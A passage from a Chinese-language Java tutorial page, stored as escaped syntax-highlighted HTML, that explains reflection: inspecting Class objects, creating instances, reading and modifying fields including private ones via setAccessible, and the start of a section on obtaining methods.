&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Class name: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Simple name: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSimpleName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getPackage&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Package name: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getPackage&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;is interface: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isInterface&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;is enum: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isEnum&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;is array: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isArray&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;is primitive: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isPrimitive&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>&lt;code>String[]&lt;/code>也是一种类，不同于&lt;code>String.class&lt;/code>，它的类名是&lt;code>[Ljava.lang.String;&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>每一种基本类型对应的&lt;code>Class&lt;/code>实例可以用&lt;code>基本类型.class&lt;/code>访问&lt;/p>
&lt;/li>
&lt;li>
&lt;p>获取到&lt;code>Class&lt;/code>实例后可以用它来创建对应类型的实例，与直接new的相比，局限在于只能调用&lt;code>public&lt;/code>的无参数构造方法，而有参数的构造方法 或非&lt;code>public&lt;/code>的构造方法都无法通过&lt;code>Class.newInstance()&lt;/code>调用&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 相当于 new String()
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="访问字段">访问字段&lt;/h3>
&lt;ul>
&lt;li>&lt;code>Class&lt;/code>类提供了以下几个方法来获取字段的（返回&lt;code>Field&lt;/code>对象&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">stdClass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 根据字段名获取某个public的field(包括父类)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;score&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// 获取public字段&amp;#34;score&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// 获取继承的public字段&amp;#34;name&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 根据字段名获取当前类的某个field(不包括父类)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;grade&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// 获取private字段&amp;#34;grade&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">score&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">grade&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>一个&lt;code>Field&lt;/code>对象包含一个字段的所有信息&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 返回字段名称
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// &amp;#34;value&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 返回字段类型 是一个Class实例(比如String.class)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getType&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// class [B 表示byte[]类型
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 返回字段的修饰符 是一个int 不同的bit有不同的含义
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getModifiers&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isFinal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isPublic&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isProtected&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isPrivate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isStatic&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>用&lt;code>Field.get(Object)&lt;/code>可以获取指定实例指定字段的值；如果字段为&lt;code>private&lt;/code>可以调用&lt;code>Field.setAccessible(true)&lt;/code>，一律访问，可能会失败的原因是JVM运行期&lt;code>SecurityManager&lt;/code>可能不允许对&lt;code>java&lt;/code>和&lt;code>javax&lt;/code>开头的package的类调用&lt;code>setAccessible(true)&lt;/code>，保护JVM核心库的安全&lt;/li>
&lt;li>同样的，用&lt;code>Field.set(Object, Object)&lt;/code>可以设置字段的值，第一个&lt;code>Object&lt;/code>参数是指定的实例，第二个&lt;code>Object&lt;/code>参数是待修改的值&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Xiao Ming&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">// &amp;#34;Xiao Ming&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 修改非public字段
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Xiao Hong&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">// &amp;#34;Xiao Hong&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Person&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="调用方法">调用方法&lt;/h3>
&lt;ul>
&lt;li>&lt;code>Class&lt;/code>类提供了以下几个方法来获取方法的（返回&lt;code>Method&lt;/code>对象&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">stdClass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获取某个public的Method(包括父类)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getScore&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// 获取public方法getScore，参数为String
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getName&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// 获取继承的public方法getName，无参数
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 获取当前类的某个Method(不包括父类)
